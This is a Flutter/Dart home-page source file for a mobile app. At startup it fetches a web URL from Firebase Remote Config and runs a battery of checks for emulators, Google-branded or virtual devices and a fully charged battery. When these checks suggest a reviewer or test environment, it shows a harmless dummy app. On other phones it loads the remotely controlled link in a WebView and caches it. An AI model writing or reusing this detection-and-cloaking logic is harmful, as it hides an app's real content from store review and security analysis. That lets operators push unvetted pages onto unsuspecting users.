import 'package:battery_info/battery_info_plugin.dart';
import 'package:check_vpn_connection/check_vpn_connection.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:firebase_remote_config/firebase_remote_config.dart';
import 'package:flutter/material.dart';
import 'package:path_provider/path_provider.dart';
import 'package:project_003/pages/dummy_app.dart';
import 'package:project_003/pages/web_view_page.dart';
import 'error_page.dart';
import 'loading_page.dart';
import 'no_internet_page.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'dart:io';


class HomePage extends StatefulWidget {
  const HomePage({Key? key}) : super(key: key);

  @override
  State<HomePage> createState() => _HomePageState();
}

class _HomePageState extends State<HomePage> {

  //final Future<SharedPreferences> _prefs = SharedPreferences.getInstance();
  late Future startUpFuture;
  String errorMsg = '';
  String link = '';
  bool vpn = false;
  static const remoteConfigLinkName0 = 'WEB_AD_URI_HOST';
  //static const remoteConfigLinkName1 = 'to';



  @override
  void initState() {
    super.initState();

    startUpFuture = startUp();

  }

  ///--------------------StatUp procedure------------------------
  ///
  /// Returns:
  ///   1 - if link saved on device and have internet
  ///       or if no link on device but got proper link from remote config and all conditions are met
  ///   2 - if link saved on device but no internet
  ///   3 - if no link on device and got error from Firebase
  ///   0 - if no link on device, got proper link from remote config but it's empty or conditions are not met
  Future<int> startUp() async {
    var a = await checkLocalLink();
    if(a){
      var b = await checkInternet();
      if(b) {
        return 1;/// WebViewPage
      } else {
        return 0;//TODO
        return 2;/// NoInternetPage
      }
    } else {
      var c = await loadRemCon();
      if(c) {
        var d = await checkConditions();
        if(d) {
          await saveLink(link);
          return 1;/// WebViewPage
        } else {
          return 0;/// DummyApp
        }
      } else {
        return 0;//TODO
        return 3;/// ErrorPage
      }
    }
  }
  ///-------------------------------------------------------------

  ///----------------Check link on device---------------------
  // Future<bool> checkLink() async {
  //   final SharedPreferences prefs = await _prefs;
  //   var l = prefs.getString(remoteConfigLinkName);
  //   if(l != null) {
  //     link = l;
  //     return true;
  //   } else {
  //     return false;
  //   }
  // }
  ///----------------------------------------------------------

  Future<String> get _localPath async {
    final directory = await getApplicationDocumentsDirectory();
    return directory.path;
  }

  Future<File> get _localFile async {
    final path = await _localPath;
    return File('$path/url.txt');
  }

  Future<File> saveLink(String url) async {
    final file = await _localFile;
    return file.writeAsString(url);
  }

  Future<bool> checkLocalLink() async {
    try {
      final file = await _localFile;
      final contents = await file.readAsString();
      link = contents;
      return true;
    } catch (e) {
      return false;
    }
  }


  ///-------------------------Save link-----------------------
    // Future<bool> saveLink(String link) async {
  //   final SharedPreferences prefs = await _prefs;
  //   try {
  //     prefs.setString(remoteConfigLinkName, link);
  //     return true;
  //   } catch(e) {
  //     return false;
  //   }
  // }
  ///---------------------------------------------------------

  ///-------------------------Delete link-----------------------
  // Future<bool> deleteLink() async {
  //   final SharedPreferences prefs = await _prefs;
  //   try {
  //     prefs.clear();
  //     return true;
  //   } catch(e) {
  //     return false;
  //   }
  //
  // }
  ///---------------------------------------------------------

  ///----------------------Load Remote Config-----------------
  Future<bool> loadRemCon() async {
    /// Set up remote config
    final remoteConfig = FirebaseRemoteConfig.instance;
    await remoteConfig.setConfigSettings(RemoteConfigSettings(
      fetchTimeout: const Duration(minutes: 0),
      minimumFetchInterval: const Duration(hours: 0),
    ));
    await remoteConfig.setDefaults(const {remoteConfigLinkName0: ''});
    /// Get remote config from firebase
    try {
      await remoteConfig.fetchAndActivate();
      remoteConfig.ensureInitialized();
      link = remoteConfig.getString(remoteConfigLinkName0);
      //vpn = remoteConfig.getBool(remoteConfigLinkName1);
      return true;
    } catch (e) {
      errorMsg = e.toString();
      return false;
    }
  }
  ///---------------------------------------------------------

  ///-------------------------Check Internet------------------
  Future<bool> checkInternet() async {
    final connectivityResult = await (Connectivity().checkConnectivity());
    return connectivityResult != ConnectivityResult.none ? true : false;
  }
  ///---------------------------------------------------------

  ///----------------Check for conditions---------------------
  Future<bool> checkConditions() async {
    DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
    AndroidDeviceInfo em = await deviceInfo.androidInfo;
    var phoneModel = em.model;
    var buildProduct = em.product;
    var buildHardware = em.hardware;
    var batteryInfo = (await BatteryInfoPlugin().androidBatteryInfo)?.batteryLevel;

    var result = (link.isEmpty ||
        em.fingerprint.startsWith('generic') ||
        phoneModel.contains('google_sdk') ||
        phoneModel.contains('droid4x') ||
        phoneModel.contains('Emulator') ||
        phoneModel.contains('Android SDK built for x86') ||
        em.manufacturer.contains('Genymotion') ||
        buildHardware == 'goldfish' ||
        buildHardware == 'vbox86' ||
        buildProduct == 'sdk' ||
        buildProduct == 'google_sdk' ||
        buildProduct == 'sdk_x86' ||
        buildProduct == 'vbox86p' ||
        em.brand.contains('google') ||
        em.board.toLowerCase().contains('nox') ||
        buildHardware.toLowerCase().contains('nox') ||
        !em.isPhysicalDevice ||
        buildProduct.toLowerCase().contains('nox') ||
        batteryInfo! > 99
    );

    /// check for VPN if vpn variable from remote config is true
    // if(vpn) {
    //   if (await CheckVpnConnection.isVpnActive()) {
    //     result = true;
    //   }else{
    //     result = false;
    //   }
    // }

    return !result;
  }
  ///----------------------------------------------------------

  ///----------------Reload---------------------
  void reload() {
    setState(() {
      startUpFuture = startUp();
    });
  }
  ///--------------------------------------------



  @override
  Widget build(BuildContext context) {

    return FutureBuilder(
      future: startUpFuture,
      builder: (context, snapshot) {
        if(snapshot.connectionState == ConnectionState.done) {
          switch(snapshot.data) {
            case 0: /// Dummy app
              return const DummyApp();
            case 1: /// WebView
              return BlocView(bloc: link,);
            case 2: /// No Internet screen
              return NoInternetPage(
                onTap: () {
                  reload();
                }
              );
            case 3: /// Error screen
              return ErrorPage(
                error: errorMsg,
                onTap: () {
                  reload();
                }
              );
            default: /// Dummy app
              return const DummyApp();
          }
        } else {
          /// Loading screen
          return const LoadingPage();
        }

      },
    );
  }
}


